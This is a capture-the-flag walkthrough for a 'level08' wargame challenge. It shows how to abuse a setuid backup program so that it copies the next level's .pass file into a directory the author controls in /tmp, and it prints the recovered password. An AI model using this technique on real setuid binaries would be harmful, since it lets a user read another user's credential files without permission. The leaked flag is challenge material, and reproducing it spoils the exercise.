# level08
The program require a filename as argument `argv[1]`

```console
$ ./level08
Usage: ./level08 filename
ERROR: Failed to open (null)
```


below the different files
```console
.:
drwxrwx---+ 1 level09 users      60 Oct 19  2016 backups
-rwsr-s---+ 1 level09 users   12975 Oct 19  2016 level08

./backups:
-rwxrwx---+ 1 level09 users    32 Sep  3 12:21 .log
```

## Step 1: Understand the program

1. The program tries to open `./backups/.log` file
2. The program tries to open `argv[1]` file
3. The program tries to create and open `./backups/argv[1]` file
4. Finally the program write the content of `argv[1]` file into `./backups/argv[1]` file

## Goal
Open `/home/users/level09/.pass` file and write its content into a writable file

## Step 2:
Change directory to `/tmp` to be able to create a file
```bash
cd /tmp
```

## Step 3: Let's Try:
```bash
/tmp$ /home/users/level08/level08 /home/users/level09/.pass
ERROR: Failed to open ./backups/.log
```

We need to create a file `./backups/.log`  

```bash
/tmp$ mkdir -p backups/
/tmp$ touch backups/.log
```

## Step 4: Let's try again
```bash
/tmp$ /home/users/level08/level08 /home/users/level09/.pass
ERROR: Failed to open ./backups//home/users/level09/.pass
```

We need to create a file `./backups//home/users/level09/.pass`  

```bash
/tmp$ mkdir -p backups/home/users/level09/
```

Then, it works.
```console
/tmp$ /home/users/level08/level08 /home/users/level09/.pass
/tmp$ cat backups/home/users/level09/.pass
fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
```


> the two `//` in the path change nothing, it the same as only one `/`

